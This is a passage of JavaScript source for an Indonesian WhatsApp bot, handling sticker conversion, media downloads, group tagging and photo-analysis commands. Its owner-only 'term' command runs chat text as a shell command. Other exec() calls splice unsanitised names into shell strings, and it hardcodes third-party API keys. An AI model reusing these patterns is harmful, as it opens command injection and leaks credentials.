            })
            .addOutputOptions([
              `-vcodec`,
              `libwebp`,
              `-vf`,
              `scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=15, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse`,
            ])
            .toFormat("webp")
            .save(ran);
        } else if (
          ((isMedia && iky.message.videoMessage.seconds < 11) ||
            (isQuotedVideo &&
              iky.message.extendedTextMessage.contextInfo.quotedMessage
                .videoMessage.seconds < 11)) &&
          args.length == 0
        ) {
          const encmedia = isQuotedVideo
            ? JSON.parse(JSON.stringify(iky).replace("quotedM", "m")).message
                .extendedTextMessage.contextInfo
            : iky;
          const media = await ikyc.downloadAndSaveMediaMessage(encmedia);
          ran = "999.webp";
          reply(mess.wait);
          await ffmpeg(`./${media}`)
            .inputFormat(media.split(".")[1])
            .on("start", function (cmd) {
              console.log(`Started : ${cmd}`);
            })
            .on("error", function (err) {
              console.log(`Error : ${err}`);
              fs.unlinkSync(media);
              tipe = media.endsWith(".mp4") ? "video" : "gif";
              reply(`Gagal, pada saat mengkonversi ${tipe} ke stiker`);
            })
            .on("end", function () {
              console.log("Finish");
              ikyc.sendMessage(from, fs.readFileSync(ran), sticker, {
                quoted: iky,
              });
              fs.unlinkSync(media);
              fs.unlinkSync(ran);
            })
            .addOutputOptions([
              `-vcodec`,
              `libwebp`,
              `-vf`,
              `scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=15, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse`,
            ])
            .toFormat("webp")
            .save(ran);
        } else {
          reply(
            `Kirim gambar dengan caption ${prefix}sticker\nDurasi Sticker Video 1-9 Detik`
          );
        }
        break;
					case 'stickerwm':
					case 'swm':           
						if (isMedia && !iky.message.videoMessage || isQuotedImage) {
							ppp = `${args.join(' ')}`
							const encmedia = isQuotedImage ? JSON.parse(JSON.stringify(iky).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : iky
							const media = await ikyc.downloadAndSaveMediaMessage(encmedia, `./sticker/${sender}`)
							const packname1 = ppp.split('|')[0]
							const author1 = ppp.split('|')[1]
							exif.create(packname1, author1, `stickwm_${sender}`)
							await ffmpeg(`${media}`)
									.input(media)
									.on('start', function (cmd) {
										console.log(`Started : ${cmd}`)
									})
									.on('error', function (err) {
										console.log(`Error : ${err}`)
										fs.unlinkSync(media)
										reply(mess.error.api)
									})
									.on('end', function () {
										console.log('Finish')
										exec(`webpmux -set exif ./sticker/stickwm_${sender}.exif ./sticker/${sender}.webp -o ./sticker/${sender}.webp`, async (error) => {
											if (error) return reply(mess.error.api)
											ikyc.sendMessage(from, fs.readFileSync(`./sticker/${sender}.webp`), sticker, {quoted: iky})
											fs.unlinkSync(media)	
											fs.unlinkSync(`./sticker/${sender}.webp`)	
											fs.unlinkSync(`./sticker/stickwm_${sender}.exif`)
										})
									})
									.addOutputOptions([`-vcodec`,`libwebp`,`-vf`,`scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=15, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse`])
									.toFormat('webp')
									.save(`./sticker/${sender}.webp`)
						} else if ((isMedia && iky.message.videoMessage.fileLength < 10000000 || isQuotedVideo && iky.message.extendedTextMessage.contextInfo.quotedMessage.videoMessage.fileLength < 10000000)) {
							wmsti = body.slice(11)
							if (!wmsti.includes('|')) return reply(`Kirim gambar atau reply gambar dengan caption *${prefix}stickerwm nama|author*`)
							const encmedia = isQuotedVideo ? JSON.parse(JSON.stringify(iky).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : iky
							const media = await ikyc.downloadAndSaveMediaMessage(encmedia, `./sticker/${sender}`)
							const packname1 = wmsti.split('|')[0]
							const author1 = wmsti.split('|')[1]
							exif.create(packname1, author1, `stickwm_${sender}`)
							reply(mess.wait)
								await ffmpeg(`${media}`)
									.inputFormat(media.split('.')[4])
									.on('start', function (cmd) {
										console.log(`Started : ${cmd}`)
									})
									.on('error', function (err) {
										console.log(`Error : ${err}`)
										fs.unlinkSync(media)
										tipe = media.endsWith('.mp4') ? 'video' : 'gif'
										reply(mess.error.api)
									})
									.on('end', function () {
										console.log('Finish')
										exec(`webpmux -set exif ./sticker/stickwm_${sender}.exif ./sticker/${sender}.webp -o ./sticker/${sender}.webp`, async (error) => {
											if (error) return reply(mess.error.api)
											ikyc.sendMessage(from, fs.readFileSync(`./sticker/${sender}.webp`), sticker, {quoted: iky})
											fs.unlinkSync(media)
											fs.unlinkSync(`./sticker/${sender}.webp`)
											fs.unlinkSync(`./sticker/stickwm_${sender}.exif`)
										})
									})
									.addOutputOptions([`-vcodec`,`libwebp`,`-vf`,`scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=15, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse`])
									.toFormat('webp')
									.save(`./sticker/${sender}.webp`)
						} else {
							reply(`Kirim gambar/video dengan caption ${prefix}stickerwm nama|author atau tag gambar/video yang sudah dikirim\nNote : Durasi video maximal 10 detik`)
						}
						break
        case 'toimg':
			if (!isQuotedSticker) return setReply('Reply stickernya')
			setReply(mess.wait)
			encmedia = JSON.parse(JSON.stringify(iky).replace('quotedM','m')).message.extendedTextMessage.contextInfo
			media = await ikyc.downloadAndSaveMediaMessage(encmedia)
			ran = getRandom('.png')
			exec(`ffmpeg -i ${media} ${ran}`, (err) => {
			fs.unlinkSync(media)
			if (err) return setReply('Gagal Ngeb, Coba Ulang :/')
			buffer = fs.readFileSync(ran)
			ikyc.sendMessage(from, buffer, image)
			fs.unlinkSync(ran)
			})
			break
break



            case 'addcmd': 
			case 'setcmd':{
                  if (!iky.key.fromMe && !isOwner) return setReply(mess.owner)
                  if (isQuotedSticker) {
                  if (!q) return setReply(`Penggunaan : ${command} cmdnya dan tag stickernya`)
                  var kodenya = iky.message.extendedTextMessage.contextInfo.quotedMessage.stickerMessage.fileSha256.toString('base64')
                   if (checkSCommand(kodenya, _scommand) === true) return setReply(`Command tersebut sudah ada`)
                  addCmd(kodenya, q)
                  setReply("_Success_")
                  } else {
                  setReply('tag stickenya')
                  }
                  }
            break
            
            
			
            case 'toptt':
             if (isQuotedAudio){
					setReply(mess.wait)
					encmedia = JSON.parse(JSON.stringify(iky).replace('quotedM','m')).message.extendedTextMessage.contextInfo
					media = await ikyc.downloadAndSaveMediaMessage(encmedia)
					ran = getRandom('.mp3')
					exec(`ffmpeg -i ${media} ${ran}`, (err) => {
						fs.unlinkSync(media)
						if (err) return setReply('Gagal mengkonversi audio ke ptt')
						topt = fs.readFileSync(ran)
						 ikyc.sendMessage(from, topt, audio, {mimetype: 'audio/mp4', quoted: iky, ptt:true})
						fs.unlinkSync(ran)
						})
						}
					break
            
   
            
            case 'delcmd':{
                  if (!iky.key.fromMe && !isOwner) return setReply(mess.owner)
                  if (!isQuotedSticker) return setReply(`Penggunaan : ${command} tagsticker`)
                  var kodenya = iky.message.extendedTextMessage.contextInfo.quotedMessage.stickerMessage.fileSha256.toString('base64')
                  if (checkSCommand(kodenya, _scommand) === false) return setReply(`Command tersebut tidak ada`)
                  _scommand.splice(getCommandPosition(kodenya), 1)
                  fs.writeFileSync('./database/scommand.json', JSON.stringify(_scommand))
                  setReply("_Success_")
                  }
            break
            case 'listcmd':
let teksnyee = `\`\`\`「 LIST STICKER CMD 」\`\`\``
let cemde = [];
for (let i of _scommand) {
cemde.push(i.id)
teksnyee += `\n\n*•> ID :* ${i.id}\n*•> Cmd* : ${i.chats}`
}
mentions(teksnyee, cemde, true)
break
    case 'toimg':
			if (!isQuotedSticker) return setReply('Reply stickernya')
			setReply(mess.wait)
			encmedia = JSON.parse(JSON.stringify(iky).replace('quotedM','m')).message.extendedTextMessage.contextInfo
			media = await ikyc.downloadAndSaveMediaMessage(encmedia)
			ran = getRandom('.png')
			exec(`ffmpeg -i ${media} ${ran}`, (err) => {
			fs.unlinkSync(media)
			if (err) return setReply('Gagal Ngeb, Coba Ulang :/')
			buffer = fs.readFileSync(ran)
			ikyc.sendMessage(from, buffer, image)
			fs.unlinkSync(ran)
			})
			break
	
	
			
			
	
	
	case 'semoji':
			if (!q) return setReply('emojinya?')
			qes = args.join(' ')
			emoji.get(`${qes}`).then(emoji => {
			teks = `${emoji.images[4].url}`
    		sendStickerFromUrl(from,`${teks}`)	
    		console.log(teks)
   			})
    		break           
 case 'gimages':
case 'googleimage':
case 'image':
if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
if (args.length < 1) return setReply('Apa Yang Mau Dicari?')
setReply(mess.wait)
teks = args.join(' ')
res = await gis(teks, google)
function google(error, result){
if (error){ return setReply('_[ ! ] Error Terjari Kesalahan Atau Hasil Tidak Ditemukan_')}
else {
var gugIm = result
var random =  gugIm[Math.floor(Math.random() * gugIm.length)].url
sendFileFromUrl(random, image, {quoted: iky, caption: `*Hasil Pencarian Dari :* ${teks}`})
}
}
limitAdd(sender, limit)
break



case 'listonline':
             if (!isGroup) return reply(`*Only group*`)
             try {
             let ido = args && /\d+\-\d+@g.us/.test(args[0]) ? args[0] : from
             let online = [...Object.keys(ikyc.chats.get(ido).presences), ikyc.user.jid]
             ikyc.sendMessage(from, '*List Online:*\n' + online.map(v => '- @' + v.replace(/@.+/, '')).join `\n`, text, { quoted: ftrol, contextInfo: { mentionedJid: online }})
             } catch (e) {
             reply(`${e}`)
}
             break
case 'listgc':
case 'gclist':
case 'listgroup':
                case 'listgrup':
                case 'listgrop':
                case 'gruplist':
                case 'groplist':
                case 'grouplist':
  const txs = ikyc.chats.all().filter(v => v.jid.endsWith('g.us')).map(v =>`- ${ikyc.getName(v.jid)}\n${v.jid}\n[${v.read_only ? 'Left' : 'Joined'}]`).join`\n\n`
  setReply(txs)
  break
            
            
            
           
           
           
case 'brainly':
			if (args.length < 1) return reply('Pertanyaan apa')
          	brien = args.join(' ')
			brainly(`${brien}`).then(res => {
			teks = '❉───────────────────────❉\n'
			for (let Y of res.data) {
			teks += `\n*「 _BRAINLY_ 」*\n\n*➸ Pertanyaan:* ${Y.pertanyaan}\n\n*➸ Jawaban:* ${Y.jawaban[0].text}\n❉──────────────────❉\n`
			}
			ikyc.sendMessage(from, teks, text,{quoted:iky,detectLinks: false})                        
            })              
			break            
            
 	
    
     
     
    case "brainly3":
        if (isBanned) return reply(mess.ban)
        if (args.length < 1) return reply("Pertanyaan apa");
        brien = args.join(" ");
        brainly(`${brien}`).then((res) => {
          teks = "❉───────────────────────❉\n";
          for (let Y of res.data) {
            teks += `\n*「 _BRAINLY_ 」*\n\n*➸ Pertanyaan:* ${Y.pertanyaan}\n\n*➸ Jawaban:* ${Y.jawaban[0].text}\n❉──────────────────❉\n`;
          }
          ikyc.sendMessage(from, teks, text, {
            quoted: iky,
            detectLinks: false,
          });
        });
        break;
			
			
    
            
            
    

  
	case 'term':
    if (!iky.key.fromMe && !isOwner) return setReply(mess.owner)
			if (!q) return setReply(mess.wrongFormat)
			exec(q, (err, stdout) => {
			if (err) return setReply(`SELF-BOT:~ ${err}`)
			if (stdout) {
			setReply(stdout)
			}
			})
		    break 
		
		
    case 'join':    
    try{
                          if (!isOwner)return setReply(`Perintah ini Khusus owner`) 
                          if (args.length < 1) return setReply(`Kirim perintah *${prefix}join* link grup`)
                          if(!isGroup){
                          if (!isUrl(args[0]) && !args[0].includes('chat.whatsapp.com')) return setReply(mess.error.Iv)
                          let code = args[0].replace('https://chat.whatsapp.com/', '')
                          ikyc.acceptInvite(code)
                         
                          setReply(`_Succses Join Group!_`)
                          } else {
                            if (!isUrl(args[0]) && !args[0].includes('https://chat.whatsapp.com/')) return setReply('*The link is invalid Tod*')
                            link = args[0].replace('https://chat.whatsapp.com/','')
                            fak = ikyc.query({ json: ['action', 'invite', link],
                            expect200: true })
                           
                            setReply('*Successfully Entered Group*')
                            }
                           }catch (err){
						console.log(err)
						return setReply("Link Error")
					}
                           break
                 
                 
                case 'ovo':
                  ikyc.sendMessage(from, fs.readFileSync('./kode qr/ovo.jpg'), image, {quoted: setQuoted})
                    break 
                case 'gopay':
                  ikyc.sendMessage(from, fs.readFileSync('./kode qr/gopay.jpg'), image, {quoted: setQuoted})
                    break 
                     case 'dana':
                  ikyc.sendMessage(from, fs.readFileSync('./kode qr/dana.jpg'), image, {quoted: setQuoted})
                    break 
                 
    

            
    case 'runtime':
    case 'test':
    {
            run = process.uptime() 
            teks = kyun(run)            
            await ikyc.sendMessage(from, `Bot aktif selama ${teks.split(":")[0]} Jam - ${teks.split(":")[1]} Menit - ${teks.split(":")[2]} Detik`, text, {quoted: setQuoted})
            }
            break  
      
      
	case 'speed':
	case 'ping':
			const timestamp = speed();
			exec(`neofetch --stdout`, (error, stdout, stderr) => {
			const child = stdout.toString('utf-8')
			const teks = child.replace(/Memory:/, "Ram:")
			const pingnya = `${teks}Speed: ${latensi.toFixed(4)} Second`
			ikyc.sendMessage(from, pingnya, text, {quoted: setQuoted})
			})
			break  
			
			
    case 'totag':
    if (!iky.key.fromMe && !isOwner) return setReply(mess.owner)
            if ((isMedia && !iky.message.videoMessage || isQuotedSticker) && args.length == 0) {
            encmedia = isQuotedSticker ? JSON.parse(JSON.stringify(iky).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : iky
            file = await ikyc.downloadAndSaveMediaMessage(encmedia, filename = getRandom())
            value = args.join(" ")
            var group = await ikyc.groupMetadata(from)
            var member = group['participants']
            var mem = []
            member.map(async adm => {
            mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
            })
            var options = {
                contextInfo: { mentionedJid: mem },
                quoted: iky
            }
            ini_buffer = fs.readFileSync(file)
            ikyc.sendMessage(from, ini_buffer, sticker, options)
            fs.unlinkSync(file)
            } else if ((isMedia && !iky.message.videoMessage || isQuotedImage) && args.length == 0) {
            encmedia = isQuotedImage ? JSON.parse(JSON.stringify(iky).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : iky
            file = await ikyc.downloadAndSaveMediaMessage(encmedia, filename = getRandom())
            value = args.join(" ")
            var group = await ikyc.groupMetadata(from)
            var member = group['participants']
            var mem = []
            member.map(async adm => {
            mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
            })
            var options = {
                contextInfo: { mentionedJid: mem },
                quoted: iky
            }
            ini_buffer = fs.readFileSync(file)
            ikyc.sendMessage(from, ini_buffer, image, options)
            fs.unlinkSync(file)
        } else if ((isMedia && !iky.message.videoMessage || isQuotedAudio) && args.length == 0) {
            encmedia = isQuotedAudio ? JSON.parse(JSON.stringify(iky).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : iky
            file = await ikyc.downloadAndSaveMediaMessage(encmedia, filename = getRandom())
            value = args.join(" ")
            var group = await ikyc.groupMetadata(from)
            var member = group['participants']
            var mem = []
            member.map(async adm => {
            mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
            })
            var options = {
                mimetype : 'audio/mp4',
                ptt : true,
                contextInfo: { mentionedJid: mem },
                quoted: iky
            }
            ini_buffer = fs.readFileSync(file)
            ikyc.sendMessage(from, ini_buffer, audio, options)
            fs.unlinkSync(file)
        }  else if ((isMedia && !iky.message.videoMessage || isQuotedVideo) && args.length == 0) {
            encmedia = isQuotedVideo ? JSON.parse(JSON.stringify(iky).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : iky
            file = await ikyc.downloadAndSaveMediaMessage(encmedia, filename = getRandom())
            value = args.join(" ")
            var group = await ikyc.groupMetadata(from)
            var member = group['participants']
            var mem = []
            member.map(async adm => {
            mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
            })
            var options = {
                mimetype : 'video/mp4',
                contextInfo: { mentionedJid: mem },
                quoted: iky
            }
            ini_buffer = fs.readFileSync(file)
            ikyc.sendMessage(from, ini_buffer, video, options)
            fs.unlinkSync(file)
        } else{
          setReply(`reply gambar/sticker/audio/video dengan caption ${prefix}totag`)
        }
        break
    
    case 'tourl2':
            if ((isMedia && !iky.message.videoMessage || isQuotedImage || isQuotedVideo ) && args.length == 0) {
            boij = isQuotedImage || isQuotedVideo ? JSON.parse(JSON.stringify(iky).replace('quotedM','m')).message.extendedTextMessage.contextInfo : iky
            owgi = await ikyc.downloadMediaMessage(boij)
            res = await upload(owgi)
            setReply(res)
            } else {
            setReply('kirim/reply gambar/video')
            }
            break	
    
    
    case 'inspect':
    if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
            try{
            setReply(mess.wait)
            if (!isUrl(args[0]) && !args[0].includes('whatsapp.com')) return setReply(mess.Iv)
            if (!q) return setReply('masukan link wa')
            cos = args[0]
            var net = cos.split('https://chat.whatsapp.com/')[1]
            if (!net) return setReply('pastikan itu link https://whatsapp.com/')
            jids = []
            let { id, owner, subject, subjectOwner, desc, descId, participants, size, descOwner, descTime, creation} = await ikyc.query({ 
            json: ["query", "invite",net],
            expect200:true })
            let par = `*Id* : ${id}
${owner ? `*Owner* : @${owner.split('@')[0]}` : '*Owner* : -'}
*Nama Gc* : ${subject}
*Gc dibuat Tanggal* : ${formatDate(creation * 1000)}
*Jumlah Member* : ${size}
${desc ? `*Desc* : ${desc}` : '*Desc* : tidak ada'}
*Id desc* : ${descId}
${descOwner ? `*Desc diubah oleh* : @${descOwner.split('@')[0]}` : '*Desc diubah oleh* : -'}\n*Tanggal* : ${descTime ? `${formatDate(descTime * 1000)}` : '-'}\n\n*Kontak yang tersimpan*\n`
           for ( let y of participants) {
             par += `> @${y.id.split('@')[0]}\n*Admin* : ${y.isAdmin ? 'Ya' : 'Tidak'}\n`
             jids.push(`${y.id.replace(/@c.us/g,'@s.whatsapp.net')}`)
             }
             jids.push(`${owner ? `${owner.replace(/@c.us/g,'@s.whatsapp.net')}` : '-'}`)
             jids.push(`${descOwner ? `${descOwner.replace(/@c.us/g,'@s.whatsapp.net')}` : '-'}`)
             ikyc.sendMessage(from,par,text,{quoted:iky,contextInfo:{mentionedJid:jids}})
             limitAdd(sender, limit)
             } catch (err){
						console.log(err)
						setReply(err)
					}
			
             break
             
            
					
										case 'sider':
										try{
										if (iky.message.extendedTextMessage === undefined || iky.message.extendedTextMessage === null) return setReply('Reply targetnya!')
infom = await ikyc.messageInfo(from, iky.message.extendedTextMessage.contextInfo.stanzaId)
tagg = []
shape = '▢'
teks = `Telah Dibaca Oleh :\n\n`
for(let i of infom.reads){
teks += shape+' ' + '@' + i.jid.split('@')[0] + '\n'
teks += `┗━ ${shape} Waktu : ` + moment(`${i.t}` * 1000).tz('Asia/Jakarta').format('DD/MM/YYYY HH:mm:ss') + '\n\n'
tagg.push(i.jid)
}
mentions(teks, tagg, true)
} catch (err){
						console.log(err)
						setReply("Uh emror, pastikan yang di reply pesan dari botnya ya kak")
					}
break

					case 'banchat':
				     if (!isOwner) return onlyOwner()
if (!isGroup) return setReply(mess.only.group)

if (isBanchat) return setReply(`udah di ban`)
bancht.push(from)
fs.writeFileSync('./database/banchat.json', JSON.stringify(bancht))
setReply(`Bot berhasil Ban di group ini`)
break


					

case 'unbanchat':
				if (!isOwner) return onlyOwner() 
					try {
if (!isBanchat) return setReply(`udah di UnBan`)
let anu = bancht.indexOf(from)
bancht.splice(anu, 1)
fs.writeFileSync('./database/banchat.json', JSON.stringify(bancht))
setReply(`Bot telah di Unban di group ini`)
} catch (err){
						console.log(err)
						setReply(err)
					}
					break




case 'infoall': case 'tagall':
 if(isZadani) return
if(!q) return setReply('Ingfonya apa?')
if (!isGroup) return setReply(mess.only.group)
var nomor = iky.participant
members_id = []
	teks = '\n'
	for (let mem of groupMembers) {
	teks += `┣ ⬣@${mem.jid.split('@')[0]}\n`
	members_id.push(mem.jid)
	}
mentions(`
*From :* ${pushname}

 Info :  ${q}

Total Member : ${groupMembers.length} 

┏━⬣`+teks+`┗━⬣`, members_id, false)
break
case 'tag2':
 if(isZadani) return
if(!q) return setReply('Ingfonya apa?')
if (!isGroup) return setReply(mess.only.group)
var nomor = iky.participant
members_id = []
	teks = '\n'
	for (let mem of groupMembers) {
	teks += `┣ ${q} @${mem.jid.split('@')[0]}\n`
	members_id.push(mem.jid)
	}
mentions(`
*From :* ${pushname}

Total Member : ${groupMembers.length} 

┏━➣`+teks+`┗━➣`, members_id, false)
break
case 'wame':
 if(isZadani) return
if (!isGroup) return setReply(mess.only.group)
var nomor = iky.participant
members_id = []
	teks = '\n'
	for (let mem of groupMembers) {
	teks += `┣ ⬣wa.me/${mem.jid.split('@')[0]}\n`
	members_id.push(mem.jid)
	}
mentions(`
𝙁𝙍𝙊𝙈 : ${pushname}

𝙏𝙊𝙏𝘼𝙇 𝙈𝙀𝙈 : ${groupMembers.length} 

𝙄𝘿 𝙂𝙍𝙊𝙐𝙋 : ${from}

𝘿𝙄𝘽𝙐𝘼𝙏 : ${moment(`${groupMetadata.creation}` * 1000).tz('Asia/Jakarta').format('DD/MM/YYYY HH:mm:ss')}

𝙅𝙐𝙈𝙇𝘼𝙃 𝘼𝘿𝙈𝙄𝙉 : ${groupAdmins.length}

┏━⬣`+teks+`┗━⬣`, members_id, false)
break


case 'playytmp3':
			if (args.length === 0) return setReply(`Kirim perintah *${prefix}ytmp3 [linkYt]*`)
			let isLinks = args[0].match(/(?:https?:\/{2})?(?:w{3}\.)?youtu(?:be)?\.(?:com|be)(?:\/watch\?v=|\/)([^\s&]+)/)
			if (!isLinks) return setReply(mess.error.Iv)
			
				try {
				setReply(mess.wait)
				yta(args[0])
				.then((res) => {
				const { dl_link, thumb, title, filesizeF, filesize } = res
				axios.get(`https://tinyurl.com/api-create.php?url=${dl_link}`)
				.then((a) => {
			    if (Number(filesize) >= 15000) return sendMediaURL(from, thumb, `┏┉⌣ ┈̥-̶̯͡..̷̴✽̶┄┈┈┈┈┈┈┈┈┈┈┉┓
┆ *YOUTUBE MP3*
└┈┈┈┈┈┈┈┈┈┈┈⌣ ┈̥-̶̯͡..̷̴✽̶⌣ ✽̶

*Data Berhasil Didapatkan!*
\`\`\`▢ Title : ${title}
\`\`\`▢ Ext : MP3
\`\`\`▢ Filesize : ${filesizeF}
\`\`\`▢ Link : ${a.data}
_Untuk durasi lebih dari batas disajikan dalam bentuk link_`)
				const captions = `┏┉⌣ ┈̥-̶̯͡..̷̴✽̶┄┈┈┈┈┈┈┈┈┈┈┉┓
┆ *YOUTUBE MP3*
└┈┈┈┈┈┈┈┈┈┈┈⌣ ┈̥-̶̯͡..̷̴✽̶⌣ ✽̶

*Data Berhasil Didapatkan!*
\`\`\`▢ Title : ${title}\`\`\`
\`\`\`▢ Ext : MP3\`\`\`
\`\`\`▢ Size : ${filesizeF}\`\`\`

_Silahkan tunggu file media sedang dikirim mungkin butuh beberapa menit_`
				sendMediaURL(from, thumb, captions)
				sendMediaURL(from, dl_link).catch(() => setReply(mess.error.api))
				})
				})
				} catch (err) {
				setReply(mess.error.api)
				}
				break

 
 case 'ytmp3':
 if (!isPremium && !isOwner) return setReply(`Kamu bukan user premium`)
                    if (args.length == 0) return reply(`Example: ${prefix + command} https://www.youtube.com/watch?v=qZIQAk-BUEc`)
                    ini_link = args[0]
                    get_result = await fetchJson(`https://api.lolhuman.xyz/api/ytaudio2?apikey=${apikey}&url=${ini_link}`)
                    get_result = get_result.result
                    caption = `❖ Title    : *${get_result.title}*\n`
                    caption += `❖ Size     : *${get_result.size}*`
                    ini_buffer = await getBuffer(get_result.thumbnail)
                    await ikyc.sendMessage(from, ini_buffer, image, { quoted: iky, caption: ini_link })
                    get_audio = await getBuffer(get_result.link)
                    await ikyc.sendMessage(from, get_audio, audio, { mimetype: 'audio/mp4', filename: `${get_result.title}.mp3`, quoted: iky })
                    break
                case 'ytmp4':
                if (!isPremium && !isOwner) return setReply(`Kamu bukan user premium`)
                    if (args.length == 0) return reply(`Example: ${prefix + command} https://www.youtube.com/watch?v=qZIQAk-BUEc`)
                    ini_link = args[0]
                    get_result = await fetchJson(`https://api.lolhuman.xyz/api/ytvideo2?apikey=${apikey}&url=${ini_link}`)
                    get_result = get_result.result
                    ini_txt = `${get_result.title} - ${get_result.size}`
                    ini_buffer = await getBuffer(get_result.thumbnail)
                    await ikyc.sendMessage(from, ini_buffer, image, { quoted: iky, caption: ini_txt })
                    get_audio = await getBuffer(get_result.link)
                    await ikyc.sendMessage(from, get_audio, video, { mimetype: 'video/mp4', filename: `${get_result.title}.mp4`, quoted: iky })
                    break


 

case 'sounds':
console.log('𝑺𝑶𝑼𝑵𝑫 𝑴𝑬𝑵𝑼')
ikyc.sendMessage(from, donasi.dodo(prefix), text, {quoted: iky})
break
 
 
case 'cekhp':
	            query = args.join(" ")
                    get_result = await fetchJson(`https://api.lolhuman.xyz/api/gsmarena?apikey=himaru&query=${query}`)
                    get_result = get_result.result
                    mn1k = `Nama : ${get_result.phone_name}\n`
                    ini_txt += `Network : ${get_result.specification.network.net2g} -  ${get_result.specification.network.net3g} -  ${get_result.specification.network.net4g} -  ${get_result.specification.network.net5g}\n`
                    ini_txt += `Body : ${get_result.dimensions} - ${get_result.weight} - ${get_result.build} - ${get_result.sim} - ${get_result.bodyother}\n`
                    ini_txt += `Display : ${get_result.displaytype} - ${get_result.displaysize} - ${get_result.displayresolution}\n`
                    ini_txt += `PlatFrom : ${get_result.os} - ${get_result.chipset} - ${get_result.cpu} - ${get_result.gpu}\n`
                    ini_txt += `Memo : ${get_result.memoryslot} - ${get_result.internalmemory} - ${get_result.memoryother}\n`
                    ini_txt += `Camera : ${get_result.cam1modules} - ${get_result.cam1features}\n`
                    ini_txt += `Selfie : ${get_result.cam2modules} -  ${get_result.cam2features} - ${get_result.cam2video}\n`
                    ini_txt += `Sound : ${get_result.optionalother}\n`
                    ini_txt += `Cosms : ${get_result.bluetooth} - ${get_result.gps} - ${get_result.nfc} - ${get_result.radio} - ${get_result.usb}\n`
                    ini_txt += `Features : ${get_result.sensors}\n`
                    ini_txt += `Batre rambut : ${get_result.batdescription1}\n`
                    ini_txt += `Misc : ${get_result.colors} - ${get_result.models} - ${get_result.price} - ${get_result.tests} - ${get_result.tbench} - ${get_result.batlife}`
                    buffer = await getBuffer(get_result.phone_image)
                    ikyc.sendMessage(from, get_result, buffer, image, { quoted: iky, caption: ini_txt })
                    break 
 
 case 'deteksiwajah':	
	if (isBanned) return reply('Maaf kamu sudah terbenned!')
	var imgbb = require('imgbb-uploader')
	if ((isMedia && !iky.message.videoMessage || isQuotedImage) && args.length == 0) {
	  ted = isQuotedImage ? JSON.parse(JSON.stringify(iky).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo: iky
	  reply(mess.wait)
	  owgi = await ikyc.downloadAndSaveMediaMessage(ted)
	  woy = await imgbb("84e2110ad43b6335d5925589e4685e8a", owgi)
	  hehe = await getBuffer(`http://api.lolhuman.xyz/api/facedetect?apikey=himaru&img=${woy.display_url}`)
	 ikyc.sendMessage(from, hehe, image, {quoted:iky})
	} else {
	  reply('Jangan tambah kan apapun pada command')
	}
	break
	case 'deteksigender':	
	if (isBanned) return reply('Maaf kamu sudah terbenned!')
	var imgbb = require('imgbb-uploader')
	if ((isMedia && !iky.message.videoMessage || isQuotedImage) && args.length == 0) {
	  ted = isQuotedImage ? JSON.parse(JSON.stringify(iky).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo: iky
	  reply(mess.wait)
	  owgi = await ikyc.downloadAndSaveMediaMessage(ted)
	  woy = await imgbb("84e2110ad43b6335d5925589e4685e8a", owgi)
	  hehe = await fetchJson(`http://api.lolhuman.xyz/api/genderdetect?apikey=himaru&img=${woy.display_url}`)
	  gender = `[ DETEKSI GENDER ] \nMenurut bot.. seseorang di gambar bergender = *${hehe.result}*\n\nFEMALE = PEREMPUAN\nMALE = LAKI-LAKI`
	 ikyc.sendMessage(from, gender, text, {quoted:iky})
	} else {
	  reply('Jangan tambah kan apapun pada command')
	}
	break
	case 'deteksiumur':
	if (isBanned) return reply('Maaf kamu sudah terbenned!')
	var imgbb = require('imgbb-uploader')
	if ((isMedia && !iky.message.videoMessage || isQuotedImage) && args.length == 0) {
	  ted = isQuotedImage ? JSON.parse(JSON.stringify(iky).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo: iky
	  reply(mess.wait)
	  owgi = await ikyc.downloadAndSaveMediaMessage(ted)
	  woy = await imgbb("84e2110ad43b6335d5925589e4685e8a", owgi)
	  hehe = await fetchJson(`http://api.lolhuman.xyz/api/agedetect?apikey=himaru&img=${woy.display_url}`)
	  gender = `[ DETEKSI UMUR ] \nMenurut bot.. seseorang di gambar tersebut berumur = *${hehe.result}*`
	 ikyc.sendMessage(from, gender, text, {quoted:iky})
	} else {
	  reply('Jangan tambah kan apapun pada command')
	}
	break
case 'owner':
                  ikyc.sendMessage(from, {displayname: "Jeff", vcard: vcard}, MessageType.contact, { quoted: iky})
                  ikyc.sendMessage(from, 'OWNER PALING BAIK:V',MessageType.text, { quoted: iky} )
					break    
case 'shorturl':
 case 'tinyurl':{
									if (args.length < 1) return setReply(`Masukkan link`)
									if (!isUrl) return setReply(`Masukkan link`)
									const fetchText = (url, optiono) => {
										return new Promise((resolve, reject) => {
											return fetch(url, optiono)
											.then(response => response.text())
											.then(text => resolve(text))
											.catch(err => {
												console.log(color(err,'red'))
												reject(err)
												})
											})
										}
										okok = await fetchText(`https://tinyurl.com/api-create.php?url=${q}`)
										shorti = `*Result : ${okok}*`
										setReply(shorti)
										}
									break              
case 'sewabot':
